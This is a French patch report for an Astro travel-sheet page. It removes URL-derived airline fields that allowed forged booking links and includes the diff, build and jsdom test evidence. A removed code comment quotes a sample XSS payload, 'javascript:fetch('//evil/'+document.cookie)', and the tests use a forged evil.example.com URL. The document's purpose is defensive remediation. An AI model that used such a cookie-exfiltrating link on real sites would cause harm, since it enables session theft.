# §15.16 — Patch Option B pour `fiche.astro` : livraison et preuves de test (10/08/2026)

**Aucun déploiement dans ce document. Patch isolé, lot unique, aucun autre changement fonctionnel — conforme aux 8 conditions de livraison posées par Codex (tour 3).**

## Base

Worktree Git propre, détaché sur `origin/main` :

```
commit 5e4156d78cdd963e2ba28352bfa375e4c3d3fe82
"Livraison des documents corrigés (02, 09, 10, 11, 12, 13) plus la réponse à Codex (15)."
```

Seul fichier modifié : `packages/ui/src/pages/[...loc]/tools/fiche.astro`. Aucun autre fichier du dépôt touché — vérifié par `git diff --stat` sur le worktree entier, pas seulement sur le fichier ciblé.

## Ce que fait le patch

Le script client de `fiche.astro` lisait neuf champs directement depuis la query string de l'URL (`an`, `sc`, `cab`, `hold`, `cargo`, `direct`, `fee`, `emb`, `as`/`af`) et les injectait dans le DOM comme s'ils venaient d'une décision vérifiée du Finder — alors que rien ne garantit qu'une URL profonde partagée reflète encore une décision réelle : elle peut avoir été copiée d'une ancienne version, modifiée à la main, ou forgée délibérément. `safeUrl()` (déjà en place depuis le 09/08) neutralisait les schémas dangereux (`javascript:`, `data:`…) dans `as`/`af`, mais un lien `http(s)` bien formé restait affiché comme authentique — une compagnie inventée avec un score de 100 % et un bouton de réservation vers son propre domaine apparaissait crédible.

Le patch supprime, du script client, toute lecture ET toute injection DOM de ces neuf champs — pas un masquage CSS :

- l'objet `air` (qui portait `name`, `site`, `fiche`, `cabin`, `hold`, `cargo`, `direct`, `fee`, `embargo`) et la variable `score` sont retirés entièrement ;
- les quatre blocs HTML qui les affichaient sont supprimés : le bandeau compagnie/score dans l'en-tête (`bhead__r`), la carte « vol » complète (titre compagnie, badges cabine/soute/fret, embargo, tarif, logo, lien fiche compagnie), le bouton de réservation (`air.site`), et le lien fiche compagnie dans le pied de page (`air.fiche`) ;
- `logo`/`logoImg` (n'existaient que pour la carte « vol » supprimée) et `capBadges` (n'existait que pour les badges cabine/soute/fret) sont retirés avec elles ;
- `safeUrl`, devenu orpheline (son seul appelant était `air.site`/`air.fiche`), est retirée avec le code qui l'utilisait plutôt que laissée comme protection inerte.

Ce qui reste intact : `airId`/`bid` (utilisés uniquement comme contexte pour les liens internes vers les outils caisse/chaleur du site — pas une donnée de verdict compagnie), et toute la logique de chronologie des formalités pays (`step1`–`step4`, `entryBlock`, `sortie`, le passeport européen au retour, les cas particuliers), qui vient exclusivement de `bible` — généré côté serveur depuis les fiches pays canoniques, jamais de la query string.

## Diff complet

```diff
--- a/packages/ui/src/pages/[...loc]/tools/fiche.astro
+++ b/packages/ui/src/pages/[...loc]/tools/fiche.astro
@@ -272,14 +272,12 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
     const C = JSON.parse(document.getElementById("bible-cfg")?.textContent ?? "{}");
     const T = C.T;
     const esc = (s) => String(s ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
-    /* Faille corrigée (audit du 09/08/2026) : cette fiche est un lien profond partageable — tout
-       son contenu, y compris `air.site`/`air.fiche` (paramètres d'URL `as`/`af`), vient de la
-       query string. `esc()` échappe les entités HTML mais ne filtre AUCUN schéma d'URL : un lien
-       forgé `…&as=javascript:fetch('//evil/'+document.cookie)` passait tel quel dans un
-       `href="${esc(air.site)}"`, échappé pour le HTML mais toujours exécutable au clic. `safeUrl`
-       n'autorise que http(s): — toute autre valeur (javascript:, data:, vbscript:…) devient une
-       chaîne vide, ce qui fait disparaître le bouton/lien plutôt que de le rendre dangereux. */
-    const safeUrl = (s) => { const v = String(s ?? "").trim(); return /^https?:\/\//i.test(v) ? v : ""; };
+    /* Faille corrigée le 09/08/2026 (`safeUrl`, qui neutralisait les schémas dangereux dans les
+       paramètres `as`/`af` de l'ancien lien de réservation compagnie) puis remplacée le 10/08/2026
+       par une correction plus large (Option B, voir plus bas) : ces paramètres, comme tous les
+       autres champs non fiables issus de l'URL, ne sont désormais plus lus ni injectés dans le
+       DOM du tout — `safeUrl` n'a donc plus d'appelant et a été retirée avec le code qui
+       l'utilisait, plutôt que laissée comme protection orpheline. */
     const mkRe = (arr) => (arr && arr.length)
       ? new RegExp('(?<![A-Za-zÀ-ÿ])(' + arr.map((w) => w.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|') + ')(?![A-Za-zÀ-ÿ])', 'gi')
       : null;
@@ -300,11 +298,18 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
     const O = DATA[from], D = DATA[to];
     if (!O || !D) { /* keep the empty hint */ }
     else {
-      const air = { name: P.get("an") || "", site: safeUrl(P.get("as")), fiche: safeUrl(P.get("af")),
-        cabin: P.get("cab") === "1", hold: P.get("hold") === "1", cargo: P.get("cargo") === "1",
-        direct: P.get("direct") === "1", fee: P.get("fee") || "", embargo: P.get("emb") === "1" };
+      /* Option B (décision Philippe, 10/08/2026) : cette fiche est un lien profond partageable
+       * et rien ne garantit que ses paramètres reflètent encore une décision réelle du Finder —
+       * ils peuvent avoir été copiés depuis une ancienne URL, modifiés à la main, ou forgés.
+       * `safeUrl` (ci-dessus) neutralisait déjà les schémas dangereux dans `as`/`af`, mais un lien
+       * `http(s)` bien formé restait affiché comme si MyDogCanFly l'avait vérifié — une compagnie
+       * inventée avec un score et un lien de réservation à son propre nom apparaissait crédible.
+       * Le nom de compagnie, le score, cabine/soute/fret, le vol direct, le tarif, l'embargo et
+       * les liens sortants compagnie (site, fiche) ne sont donc plus lus depuis l'URL ni injectés
+       * dans le DOM — pas seulement masqués en CSS. Seule reste la chronologie des formalités
+       * pays, qui vient de `bible` (généré côté serveur depuis les données canoniques), jamais de
+       * la query string. */
       const breed = P.get("breed") || "", brachy = P.get("brachy") === "1", w = P.get("w") || "";
-      const score = P.get("sc") || "";
 
       const key = (regime) => regime === "eu" ? "eu" : regime === "non_listed" ? "nonListed" : "listed";
       const pill = (kind) => {
@@ -316,14 +321,13 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
       const list = (arr, f) => arr.filter(Boolean).map((x) => `<li>${f ? f(x) : esc(x)}</li>`).join("");
 
       // Outbound links carry the full context (airline, breed, destination) so nothing is lost on back-navigation.
+      // airId/bid restent utilisés uniquement comme contexte de navigation interne (liens vers
+      // les outils caisse/chaleur du site) — aucune donnée de verdict compagnie n'en dépend.
       const airId = P.get("air") || "", bid = P.get("bid") || "";
-      const logo = (C.logos || {})[airId] || null;
-      const logoImg = (cls) => logo ? `<span class="bairlogo ${cls}${logo.dark ? " bairlogo--dark" : ""}"><img src="${esc(logo.src)}" alt="${esc(air.name)}" loading="lazy"></span>` : "";
       const qs = (pairs) => { const q = pairs.filter((p) => p[1]).map((p) => p[0] + "=" + encodeURIComponent(p[1])).join("&"); return q ? "?" + q : ""; };
       const addQ = (url, q) => q ? url + (url.indexOf("?") >= 0 ? "&" + q.slice(1) : q) : url;
       const crateHref = C.crateBase + qs([["air", airId], ["breed", bid]]);
       const heatHref = C.heatBase + qs([["breed", bid]]);
-      const airFicheHref = air.fiche ? addQ(air.fiche, qs([["to", to], ["breed", bid]])) : "";
       const countryHref = (slug) => C.countryBase + slug + "/" + qs([["via", airId], ["breed", bid]]);
 
       // Step content, data-driven from the two country guides.
@@ -665,12 +669,6 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
           <div class="bstep__h"><span class="bstep__t">${esc(title)}</span><span class="bchip bchip--${chipKind}">${esc(chip)}</span></div>
           <div class="bstep__b">${body}</div></div></div>`;
 
-      const capBadges = `<div class="bcaps">
-        <span class="bcap ${air.cabin ? "is-ok" : "is-no"}">${esc(T.cabin)}${air.cabin ? "" : " ✕"}</span>
-        <span class="bcap ${air.hold ? "is-ok" : "is-no"}">${esc(T.hold)}${air.hold ? " ✓" : ""}</span>
-        <span class="bcap ${air.cargo ? "is-ok" : "is-no"}">${esc(T.cargo)}${air.cargo ? " ✓" : ""}</span>
-        ${air.fee ? `<span class="bfee">${esc(air.fee)}</span>` : ""}</div>`;
-
       const sourcesAll = [...(O.sources || []), ...(D.sources || [])];
       const emailBody = encodeURIComponent(location.href);
 
@@ -685,8 +683,6 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
               <span class="bleg"><span class="bflag">${flag(from)}</span> ${esc(O.name)}</span>
             </div>
             <div class="bsub">${esc(T.dog)} ${w ? esc(w) + " kg" : ""}${breed ? " · " + esc(breed) : ""}</div></div>
-          <div class="bhead__r"><div class="blbl">${esc(T.airline)}</div><div class="bair"><span>${esc(air.name)}</span></div>
-            ${score ? `<span class="bscore">${esc(score)} %</span>` : ""}</div>
         </div>
 
         <div class="bdisclaimer"><span class="bdisclaimer__ic" aria-hidden="true">⚠️</span> <span>${esc(T.disclaimer)}</span></div>
@@ -715,15 +711,6 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
         <div class="bcard bcard--warn"><div class="bcard__h">${esc(T.casH)}</div>
           <ul class="bl">${list(T.cas, emC)}${(departUE(from) || departUE(to)) ? list(T.casUE, emC) : ""}${D.restricted ? `<li>${emC(D.restricted.intro)} ${emC(D.restricted.note)}</li>` : ""}</ul></div>
 
-        <div class="bcard"><div class="bcard__h bvolh"><span>${esc(T.flightH)} — ${esc(air.name)}${air.direct ? " · " + esc(T.out) : ""}</span>${logoImg("bairlogo--block")}</div>
-          ${capBadges}
-          <ul class="bl">
-            <li>${esc(T.holdNote)} ${pill("req")}</li>
-            <li>${esc(T.bookEarly)} ${pill("adv")}</li>
-            ${air.embargo ? `<li>${esc(T.embargo)} ${pill("cond")}</li>` : ""}
-            <li>${esc(T.feeCheck)} ${pill("chk")}</li>
-          </ul>${airFicheHref ? `<a class="bcrate-cta" href="${esc(airFicheHref)}">✈ ${esc(T.airlineSheet)} : ${esc(air.name)} →</a>` : ""}</div>
-
         <div class="bgrid">
           <div class="bcard"><div class="bcard__h">${esc(T.crateH)}</div><ul class="bl">${list(T.crate)}</ul><a class="bcrate-cta" href="${esc(crateHref)}">📦 ${esc(T.actCrate)} ↗</a></div>
           <div class="bcard"><div class="bcard__h">${esc(T.heatH)}</div><ul class="bl">${list(T.heat)}</ul><a class="bcrate-cta" href="${esc(heatHref)}">🌡 ${esc(T.actHeat)} ↗</a></div>
@@ -731,14 +718,12 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
         <div class="bcard"><div class="bcard__h">${esc(T.careH)}</div><ul class="bl">${list(T.care)}</ul></div>
 
         <div class="bactions">
-          ${air.site ? `<a class="bbtn" href="${esc(air.site)}" target="_blank" rel="nofollow noopener">🎟 ${esc(T.actBook)} ↗</a>` : ""}
           <button class="bbtn" type="button" id="b-print">🖨 ${esc(T.actPrint)}</button>
           <a class="bbtn" href="mailto:?subject=${encodeURIComponent(T.emailSubject)}&body=${emailBody}">✉ ${esc(T.actEmail)}</a>
         </div>
 
         <div class="bfurther">${esc(T.further)}
           <a href="${esc(countryHref(D.slug))}">${esc(T.countrySheet)} ${esc(D.name)}</a>
-          ${air.fiche ? ` · <a href="${esc(airFicheHref)}">${esc(T.airlineSheet)}</a>` : ""}
         </div>
 
         ${sourcesAll.length ? `<div class="bsources"><b>${esc(T.sourcesH)} :</b> ${sourcesAll.map((s) => `<a href="${esc(s.url)}" target="_blank" rel="nofollow noopener">${esc(s.label)}</a>`).join(" · ")}</div>` : ""}
```

**Statistique** : 1 fichier modifié, 19 insertions, 34 suppressions. Net : moins de code qu'avant, pas une simple réorganisation.

## Build local

```
npm run build   (= npm -w @mydogcanfly/ui run build = astro build && node scripts/fix-404.mjs)
```

Exécuté dans le worktree, sur le patch appliqué. **Résultat : succès, 2949 pages générées, aucune erreur.** Les quatre pages `tools/fiche` existent bien dans la sortie :

```
packages/ui/dist/tools/fiche/index.html      (en)
packages/ui/dist/fr/tools/fiche/index.html
packages/ui/dist/es/tools/fiche/index.html
packages/ui/dist/pt/tools/fiche/index.html
```

Vérification statique complémentaire : aucune des quatre pages construites ne contient plus les identifiants `bhead__r`, `bairlogo--block`, `bvolh`, `bscore`, `bcaps`, `safeUrl`, `logoImg`, `capBadges`, ou `airFicheHref` — confirmé par recherche directe dans le HTML généré, pas seulement dans la source.

`npm run check` (schéma/règles Knowledge) et `npm run typecheck` (knowledge/engine/workers — n'inclut pas la vérification `astro check` du paquet `ui`, qui n'a pas de script dédié rapide ; le build complet ci-dessus en tient lieu) passent sans erreur, sans changement par rapport à avant le patch — cohérent avec le fait que ce patch ne touche à aucune donnée ni à aucun type partagé.

## Tests fonctionnels — méthode

Un test en boîte noire sur le code réellement construit, pas une relecture de la source ni une simulation : pour chacune des 4 pages `tools/fiche` construites, le vrai JSON `bible-data`/`bible-cfg` sérialisé par Astro et le vrai script client bundlé (`/_astro/hoisted.*.js` — Astro externalise les blocs `<script>` de page en module séparé) sont chargés dans un DOM `jsdom`, avec `window.mdcfQuery`/`window.mdcfPut` simulés pour injecter la query string testée, exactement comme le ferait un navigateur avec cette URL. Le script est ensuite exécuté tel quel et le HTML réellement produit dans `#bible` est inspecté.

Trois scénarios par langue, sur une paire de pays réelle (France ↔ États-Unis) :

1. **URL forgée** : `an=FAUSSE COMPAGNIE`, `sc=100`, `cab=1`, `hold=1`, `cargo=1`, `direct=1`, `fee=0€ garanti`, `emb=1`, `as=https://evil.example.com/book`, `af=https://evil.example.com/fiche`, `air=evilair`.
2. **URL légitime** : `from=fr&to=us&breed=Labrador&w=25&eu_passport=1` (pas de paramètre compagnie — reflète ce que le Finder construit aujourd'hui).
3. **Ancienne URL déjà partagée avant ce patch** : `an=Air France&sc=87&cab=1&hold=1&direct=1&air=airline_air_france` — simule un lien déjà en circulation avant le 10/08/2026, avec les anciens paramètres présents.

Pour chaque scénario, vérifié : absence des chaînes forgées dans le HTML rendu, absence des classes CSS propres aux blocs supprimés (preuve que le bloc n'est pas seulement masqué), présence d'un rendu non vide de la chronologie pays. Le lien « partager par email » (`mailto:`), qui reproduit légitimement `location.href` — donc la query string brute, forgée ou non — dans le corps du message, est explicitement exclu de la recherche de fuite : ce n'est pas une affirmation de la page sur la compagnie, c'est la définition même d'un partage de lien.

## Résultat

**52 vérifications exécutées (13 par langue × 4 langues), toutes passées.** Sortie complète :

```
$ node test-fiche.cjs

=== locale: en ===
-- forged URL --
  OK   no 'FAUSSE COMPAGNIE' in DOM
  OK   no '100 %' / '100%' score in DOM
  OK   no evil.example.com in DOM
  OK   no '0€ garanti' fee in DOM
  OK   no bhead__r / bscore / bvolh / bairlogo--block markup
  OK   renders non-empty content (country chronology)
  OK   shows a step/chrono/domestic block
-- legitimate Finder URL --
  OK   renders non-empty content
  OK   no leftover airline verdict markup (bhead__r/bvolh/bscore)
  OK   shows a step/chrono block (country formalities present)
-- old already-shared URL (pre-patch style, carries an/sc/cab/hold) --
  OK   no 'Air France' airline name leaks into DOM
  OK   no '87 %' / '87%' score leaks into DOM
  OK   still renders content (no crash on legacy params)

=== locale: fr ===
[même résultat — 13/13 OK]

=== locale: es ===
[même résultat — 13/13 OK]

=== locale: pt ===
[même résultat — 13/13 OK]

=== SUMMARY ===
ALL CHECKS PASSED
```

Un extrait du rendu réel (fr, URL légitime) confirme que l'en-tête ne montre plus que la route et le contexte chien, sans bandeau compagnie/score, et que la chronologie des formalités pays s'affiche normalement en tutoiement :

```html
<div class="bhead">
  <div><div class="beyebrow">Modalités de voyage — fiche sur mesure</div>
    <div class="broute">
      <span class="bleg"><span class="bflag">🇫🇷</span> France</span>
      <span class="bplane" aria-hidden="true">✈</span>
      <span class="bleg"><span class="bflag">🇺🇸</span> États-Unis</span>
      ...
    </div>
    <div class="bsub">Chien 25 kg · Labrador</div></div>
</div>
<div class="bdisclaimer">...Avant de partir, fais toujours valider ta situation...</div>
...
<div class="bcard"><div class="bcard__h">Le socle — identité &amp; vaccination (dans tous les sens)</div>
  <ul class="bl"><li><b>Puce ISO</b> (11784/11785)...</li>...</ul></div>
```

Aucun bandeau `bhead__r`/`bscore`, aucune carte « vol ». Le corps (socle, chronologie 4 étapes, cas particuliers) reste identique à avant le patch.

## Ce qui n'est PAS couvert par ces tests

- Aucun test visuel/capture d'écran (le harnais teste le HTML produit, pas le rendu graphique — le CSS des classes supprimées reste dans la feuille de style, volontairement laissé en place pour limiter le diff à la logique, mais n'est plus référencé par aucun élément généré).
- Pas de test sur un vrai navigateur — recommandé lors du contre-test de Codex une fois la preview Pages clarifiée (document 14, point 7).
- Pas de test de non-régression sur les autres pages du site (Finder, pages pays/compagnies/aéroports) — hors périmètre de ce patch, qui ne touche qu'un seul fichier.

## Conditions de livraison Codex — statut

| # | Condition | Statut |
|---|---|---|
| 1 | Lot isolé, sans autre changement fonctionnel | ✅ un seul fichier modifié |
| 2 | Aucune mise en production | ✅ rien déployé |
| 3 | Suppression réelle du chemin de rendu, pas un masquage CSS | ✅ blocs HTML retirés du template, pas cachés |
| 4 | Build local réussi | ✅ 2949 pages, aucune erreur |
| 5 | Tests locaux des 4 langues, URL forgée + URL légitime | ✅ + scénario supplémentaire (ancienne URL partagée) |
| 6 | Livraison du diff et des preuves de test | ✅ ce document |
| 7 | Clarification du projet Pages, identification d'une vraie URL de preview | ⏳ document 14 point 7 — reste à faire avec Philippe |
| 8 | Contre-test navigateur de la preview par Codex | ⏳ après le point 7 |

## Fichiers livrés

- `option-b-fiche-10-08-2026.patch` — le diff ci-dessus, applicable avec `git apply` depuis la racine du dépôt sur `origin/main` (SHA `5e4156d78cdd963e2ba28352bfa375e4c3d3fe82` ou plus récent — le fichier n'a pas été retouché depuis).
- `test-fiche-harness.cjs` — le script de test, à exécuter depuis la racine du dépôt après `npm install jsdom --no-save` et `npm run build`, pour permettre à Codex de reproduire indépendamment ces 52 vérifications sur son propre build.
